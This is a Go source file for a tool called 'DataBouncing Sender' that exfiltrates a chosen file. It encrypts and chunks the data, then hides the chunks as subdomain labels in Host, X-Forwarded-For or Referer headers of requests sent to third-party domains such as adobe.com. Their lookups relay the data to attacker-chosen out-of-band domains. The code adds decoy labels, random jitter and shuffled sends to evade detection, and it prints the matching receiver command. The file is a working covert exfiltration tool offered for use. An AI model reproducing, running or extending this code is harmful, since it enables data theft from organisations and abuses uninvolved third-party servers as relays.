package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"math/big"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	dbcrypto "db26/internal/crypto"
	"db26/internal/wire"

	"github.com/valyala/fasthttp"
)

type SendConfig struct {
	InputFile     string
	Passphrase    string
	Candidates    string
	ManualTargets string
	OOBDomains    []string
	CorrIDs       []string
	Retries       int
	TimeoutSecs   int
	DecoyRate     float64
	JitterMinMS   int
	JitterMaxMS   int
	OutputLog     string
}

// ProvenCandidate is a domain + the header positions recruiter proved work.
type ProvenCandidate struct {
	Domain  string   `json:"domain"`
	Headers []string `json:"headers"` // Prefixes: "host", "xff", "ref", etc.
}

type SendLog struct {
	Timestamp   string `json:"timestamp"`
	FileID      string `json:"file_id"`
	ChunkSeq    int    `json:"chunk_seq"`
	TotalChunks int    `json:"total_chunks"`
	Domain      string `json:"domain"`
	HeaderName  string `json:"header_name"`
	HeaderPfx   string `json:"header_prefix"`
	OOBDomain   string `json:"oob_domain"`
	CorrID      string `json:"corr_id"`
}

var (
	sent   atomic.Int64
	errs   atomic.Int64
)

func main() {
	fmt.Println()
	fmt.Println("  ██████╗ ██████╗ ██████╗  ██████╗  ███████╗███████╗███╗  ██╗██████╗")
	fmt.Println("  ██╔══██╗██╔══██╗╚════██╗██╔════╝  ██╔════╝██╔════╝████╗ ██║██╔══██╗")
	fmt.Println("  ██║  ██║██████╔╝ █████╔╝███████╗  ███████╗█████╗  ██╔██╗██║██║  ██║")
	fmt.Println("  ██║  ██║██╔══██╗██╔═══╝ ██╔═══██╗ ╚════██║██╔══╝  ██║╚████║██║  ██║")
	fmt.Println("  ██████╔╝██████╔╝███████╗╚██████╔╝ ███████║███████╗██║ ╚███║██████╔╝")
	fmt.Println("  ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚══════╝╚══════╝╚═╝  ╚══╝╚═════╝")
	fmt.Println("  DataBouncing Sender")
	fmt.Println()

	cfg := parseFlags()

	// Derive session key
	sk := dbcrypto.DeriveKey(cfg.Passphrase)
	fmt.Printf("  Session key:    Argon2id derived\n")
	fmt.Printf("  Field lengths:  fileID=%d, seq=%d, total=%d\n", sk.FieldLens[0], sk.FieldLens[1], sk.FieldLens[2])
	fmt.Printf("  Salt:           %s\n", hex.EncodeToString(sk.Salt))
	fmt.Println()

	// Read + encrypt input
	plaintext, err := os.ReadFile(cfg.InputFile)
	if err != nil {
		fatal("Read input: %s", err)
	}
	checksum := dbcrypto.Checksum(plaintext)

	encrypted, err := dbcrypto.Encrypt(sk.Key, plaintext)
	if err != nil {
		fatal("Encrypt: %s", err)
	}

	// Prepend checksum as metadata
	payload := append(checksum, encrypted...)

	// Generate random file ID
	fileIDBytes := make([]byte, 2)
	rand.Read(fileIDBytes)
	fileID := uint32(fileIDBytes[0])<<8 | uint32(fileIDBytes[1])

	// Chunk
	chunks := wire.ChunkFile(fileID, payload)

	fmt.Printf("  Input:          %s (%d bytes)\n", cfg.InputFile, len(plaintext))
	fmt.Printf("  Encrypted:      %d bytes\n", len(encrypted))
	fmt.Printf("  FileID:         %03x\n", fileID)
	fmt.Printf("  Chunks:         %d × %d bytes max\n", len(chunks), wire.MaxDataPerChunk)
	fmt.Println()

	// Load proven candidates (from file and/or manual targets)
	var candidates []ProvenCandidate
	if cfg.Candidates != "" {
		candidates = loadCandidates(cfg.Candidates)
	}
	if cfg.ManualTargets != "" {
		manual := parseManualTargets(cfg.ManualTargets)
		candidates = append(candidates, manual...)
	}
	if len(candidates) == 0 {
		fatal("No candidates loaded. Use -candidates or -target")
	}

	// Count total channels (each header is a channel)
	totalChannels := 0
	for _, c := range candidates {
		totalChannels += len(c.Headers)
	}
	fmt.Printf("  Candidates:     %d domains, %d channels\n", len(candidates), totalChannels)
	fmt.Printf("  OOB domains:    %v\n", cfg.OOBDomains)
	fmt.Printf("  Retries:        %dx per chunk\n", cfg.Retries)
	fmt.Printf("  Decoy rate:     %.0f%%\n", cfg.DecoyRate*100)
	fmt.Printf("  Jitter:         %d-%dms\n", cfg.JitterMinMS, cfg.JitterMaxMS)
	fmt.Println()

	totalSends := len(chunks) * cfg.Retries

	// Open log
	var logFile *os.File
	if cfg.OutputLog != "" {
		logFile, _ = os.OpenFile(cfg.OutputLog, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if logFile != nil {
			defer logFile.Close()
		}
	}

	// HTTP client — fire and forget
	client := &fasthttp.Client{
		MaxConnsPerHost:          4,
		ReadTimeout:              500 * time.Millisecond,
		WriteTimeout:             time.Duration(cfg.TimeoutSecs) * time.Second,
		MaxResponseBodySize:      512,
		NoDefaultUserAgentHeader: true,
	}

	// Graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sigCh; fmt.Println("\n[*] Stopping..."); cancel() }()

	// Build send queue: each chunk × retries, shuffled
	type job struct {
		chunk wire.Chunk
	}
	var jobs []job
	for i := 0; i < len(chunks); i++ {
		for r := 0; r < cfg.Retries; r++ {
			jobs = append(jobs, job{chunk: chunks[i]})
		}
	}
	// Shuffle everything — interleaves chunks randomly
	for i := len(jobs) - 1; i > 0; i-- {
		j := randInt(i + 1)
		jobs[i], jobs[j] = jobs[j], jobs[i]
	}

	fmt.Printf("  Sending %d chunks × %d retries = %d requests\n\n", len(chunks), cfg.Retries, totalSends)
	start := time.Now()

	for _, j := range jobs {
		select {
		case <-ctx.Done():
			break
		default:
		}

		// Pick a random candidate
		cand := candidates[randInt(len(candidates))]

		// Pick one of its PROVEN headers
		headerPrefix := cand.Headers[randInt(len(cand.Headers))]

		// Pick a random OOB domain + corrID
		oobIdx := randInt(len(cfg.OOBDomains))
		oobDomain := cfg.OOBDomains[oobIdx]
		corrID := cfg.CorrIDs[oobIdx]

		// Encode chunk into shuffled subdomain labels
		subdomain := wire.EncodeChunkToSubdomain(j.chunk, sk, cfg.DecoyRate)

		// Build the header value using the proven header format
		headerValue := wire.BuildHeaderValue(subdomain, corrID, oobDomain, headerPrefix)
		headerName := wire.HeaderNameFromPrefix(headerPrefix)

		// Fire HTTP request to the candidate domain
		req := fasthttp.AcquireRequest()
		resp := fasthttp.AcquireResponse()

		req.SetRequestURI("http://" + cand.Domain + "/")
		req.Header.SetMethod("GET")

		if strings.EqualFold(headerName, "Host") {
			req.SetHost(headerValue)
		} else {
			req.Header.Set(headerName, headerValue)
		}

		err := client.Do(req, resp)
		fasthttp.ReleaseRequest(req)
		fasthttp.ReleaseResponse(resp)

		if err != nil {
			errs.Add(1)
		}
		sent.Add(1)

		// Log
		if logFile != nil {
			entry := SendLog{
				Timestamp:   time.Now().UTC().Format(time.RFC3339Nano),
				FileID:      fmt.Sprintf("%03x", j.chunk.FileID),
				ChunkSeq:    int(j.chunk.Seq),
				TotalChunks: int(j.chunk.Total),
				Domain:      cand.Domain,
				HeaderName:  headerName,
				HeaderPfx:   headerPrefix,
				OOBDomain:   oobDomain,
				CorrID:      corrID,
			}
			data, _ := json.Marshal(entry)
			fmt.Fprintf(logFile, "%s\n", data)
		}

		// Progress
		s := sent.Load()
		if s%50 == 0 || s == int64(totalSends) {
			elapsed := time.Since(start)
			rps := float64(s) / elapsed.Seconds()
			pct := float64(s) / float64(totalSends) * 100
			fmt.Printf("\r  [%d/%d] %.0f%% at %.0f/s | errors: %d",
				s, totalSends, pct, rps, errs.Load())
		}

		// Jitter
		if cfg.JitterMaxMS > 0 {
			jitter := cfg.JitterMinMS + randInt(cfg.JitterMaxMS-cfg.JitterMinMS+1)
			time.Sleep(time.Duration(jitter) * time.Millisecond)
		}
	}

	elapsed := time.Since(start)
	fmt.Printf("\n\n")
	fmt.Println("  ════════════════════════════════════════")
	fmt.Println("  Send Complete")
	fmt.Println("  ════════════════════════════════════════")
	fmt.Printf("  File:       %s (%d bytes)\n", cfg.InputFile, len(plaintext))
	fmt.Printf("  FileID:     %03x\n", fileID)
	fmt.Printf("  Chunks:     %d (sent %d total with retries)\n", len(chunks), sent.Load())
	fmt.Printf("  Errors:     %d\n", errs.Load())
	fmt.Printf("  Duration:   %s\n", elapsed.Truncate(time.Second))
	fmt.Printf("  Salt:       %s\n", hex.EncodeToString(sk.Salt))
	fmt.Printf("  Checksum:   %s\n", hex.EncodeToString(checksum))
	fmt.Println("  ════════════════════════════════════════")
	fmt.Println()
	fmt.Println("  Receiver command:")
	fmt.Printf("  db26-recv -passphrase \"%s\" \\\n", cfg.Passphrase)
	fmt.Printf("    -salt %s \\\n", hex.EncodeToString(sk.Salt))
	fmt.Printf("    -corr-ids %s \\\n", strings.Join(cfg.CorrIDs, ","))
	fmt.Printf("    -oob-domains %s \\\n", strings.Join(cfg.OOBDomains, ","))
	fmt.Printf("    -file-id %03x\n", fileID)
}

func parseFlags() SendConfig {
	var cfg SendConfig
	var oobStr, corrStr string

	var manualTargets string
	flag.StringVar(&cfg.InputFile, "file", "", "File to exfiltrate (required)")
	flag.StringVar(&cfg.Passphrase, "passphrase", "", "Encryption passphrase (required)")
	flag.StringVar(&cfg.Candidates, "candidates", "", "Proven candidates file from recruiter")
	flag.StringVar(&manualTargets, "target", "", "Manual target: domain,header[,domain,header,...] (e.g. adobe.com,host,cdn.net,xff)")
	flag.StringVar(&oobStr, "oob-domains", "", "OOB domains (comma-separated)")
	flag.StringVar(&corrStr, "corr-ids", "", "Correlation IDs, one per OOB domain (required)")
	flag.IntVar(&cfg.Retries, "retries", 5, "Send each chunk through N different candidates")
	flag.IntVar(&cfg.TimeoutSecs, "timeout", 2, "HTTP write timeout")
	flag.Float64Var(&cfg.DecoyRate, "decoy-rate", 0.2, "Decoy label rate (0-1)")
	flag.IntVar(&cfg.JitterMinMS, "jitter-min", 50, "Min inter-send jitter (ms)")
	flag.IntVar(&cfg.JitterMaxMS, "jitter-max", 500, "Max inter-send jitter (ms)")
	flag.StringVar(&cfg.OutputLog, "log", "send_log.jsonl", "Send log file")
	flag.Parse()

	cfg.ManualTargets = manualTargets

	if cfg.InputFile == "" || cfg.Passphrase == "" || corrStr == "" {
		fmt.Fprintf(os.Stderr, "  Required: -file, -passphrase, -corr-ids\n\n")
		fmt.Fprintf(os.Stderr, "  Candidates (one of):\n")
		fmt.Fprintf(os.Stderr, "    -candidates file.jsonl    From recruiter output\n")
		fmt.Fprintf(os.Stderr, "    -target domain,header     Manual: adobe.com,host or adobe.com,host,cdn.net,xff\n\n")
		flag.PrintDefaults()
		os.Exit(1)
	}
	if cfg.Candidates == "" && cfg.ManualTargets == "" {
		fatal("Need -candidates or -target")
	}

	cfg.OOBDomains = strings.Split(oobStr, ",")
	cfg.CorrIDs = strings.Split(corrStr, ",")

	if len(cfg.CorrIDs) != len(cfg.OOBDomains) {
		fatal("Need one -corr-ids per -oob-domains (%d domains, %d IDs)", len(cfg.OOBDomains), len(cfg.CorrIDs))
	}

	return cfg
}

// loadCandidates reads recruiter output in various formats and extracts domain+header pairs.
func loadCandidates(path string) []ProvenCandidate {
	f, err := os.Open(path)
	if err != nil {
		fatal("Open candidates: %s", err)
	}
	defer f.Close()

	var candidates []ProvenCandidate
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// JSONL format: {"domain":"example.com","headers":["host","xff"]}
		if strings.HasPrefix(line, "{") {
			var c ProvenCandidate
			if json.Unmarshal([]byte(line), &c) == nil && c.Domain != "" && len(c.Headers) > 0 {
				candidates = append(candidates, c)
				continue
			}
		}

		// Recruiter targets.txt format: domain [host,xff,ref]
		if strings.Contains(line, " [") {
			parts := strings.SplitN(line, " [", 2)
			domain := strings.TrimSpace(parts[0])
			headerStr := strings.TrimSuffix(parts[1], "]")
			headers := strings.Split(headerStr, ",")
			if domain != "" && len(headers) > 0 {
				candidates = append(candidates, ProvenCandidate{Domain: domain, Headers: headers})
				continue
			}
		}

		// Pipe format: domain | count | headers
		if strings.Contains(line, " | ") {
			parts := strings.Split(line, " | ")
			domain := strings.TrimSpace(parts[0])
			if domain != "" {
				// Default to host header if no header info
				candidates = append(candidates, ProvenCandidate{Domain: domain, Headers: []string{"host"}})
			}
		}
	}

	return candidates
}

// parseManualTargets parses -target "adobe.com,host,cdn.net,xff,other.org,ref"
// into ProvenCandidate structs. Pairs of domain,header.
func parseManualTargets(s string) []ProvenCandidate {
	parts := strings.Split(s, ",")
	var candidates []ProvenCandidate

	// Parse as pairs: domain,header,domain,header,...
	for i := 0; i+1 < len(parts); i += 2 {
		domain := strings.TrimSpace(parts[i])
		header := strings.TrimSpace(parts[i+1])
		if domain == "" || header == "" {
			continue
		}

		// Check if this domain already exists — merge headers
		found := false
		for j := range candidates {
			if candidates[j].Domain == domain {
				candidates[j].Headers = append(candidates[j].Headers, header)
				found = true
				break
			}
		}
		if !found {
			candidates = append(candidates, ProvenCandidate{
				Domain:  domain,
				Headers: []string{header},
			})
		}
	}

	return candidates
}

func fatal(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "  [!] "+format+"\n", args...)
	os.Exit(1)
}

func randInt(max int) int {
	if max <= 0 {
		return 0
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
	return int(n.Int64())
}
